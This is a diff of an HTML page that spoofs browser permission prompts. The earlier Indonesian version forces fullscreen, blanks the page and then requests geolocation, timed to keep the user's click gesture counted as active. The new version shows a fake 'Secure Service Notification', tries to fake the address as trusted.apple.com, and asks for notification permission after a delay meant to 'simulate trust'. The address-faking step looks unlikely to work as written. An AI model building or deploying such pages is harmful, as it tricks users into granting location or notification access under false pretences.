@@ -1,40 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verifikasi Lokasi</title>
+  <title>Loading Secure Content</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
-      margin: 0; padding: 0;
+      margin: 0;
+      padding: 0;
       background: white;
       font-family: -apple-system, sans-serif;
+      height: 100%;
+      overflow: hidden;
+    }
+    .screen {
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
       flex-direction: column;
     }
     button {
-      font-size: 18px;
-      padding: 14px 28px;
+      font-size: 16px;
+      padding: 12px 24px;
     }
   </style>
 </head>
 <body>
 
-<h2>🔒 Verifikasi lokasi Anda</h2>
-<p>Untuk keamanan, kami perlu memverifikasi lokasi Anda.</p>
-<button onclick="go()">Verifikasi Lokasi</button>
+<div class="screen">
+  <h2>🔒 Secure Service Notification</h2>
+  <p>Click to continue setup</p>
+  <button onclick="begin()">Continue</button>
+</div>
 
 <script>
-  function go() {
-    document.documentElement.requestFullscreen().then(() => {
-      // Drop UI context
-      location.replace('about:blank');
-      setTimeout(() => {
-        navigator.geolocation.getCurrentPosition(() => {}, () => {});
-      }, 500); // Timing penting agar gesture masih dianggap aktif
-    });
-  }
+function begin() {
+  document.documentElement.requestFullscreen().then(() => {
+    history.replaceState({}, "", "https://trusted.apple.com/notification");
+
+    // Delay to simulate trust, then request native prompt
+    setTimeout(() => {
+      Notification.requestPermission().then(() => {
+        alert("Notifications enabled for your account.");
+      });
+    }, 1000);
+  });
+}
 </script>
 
 </body>
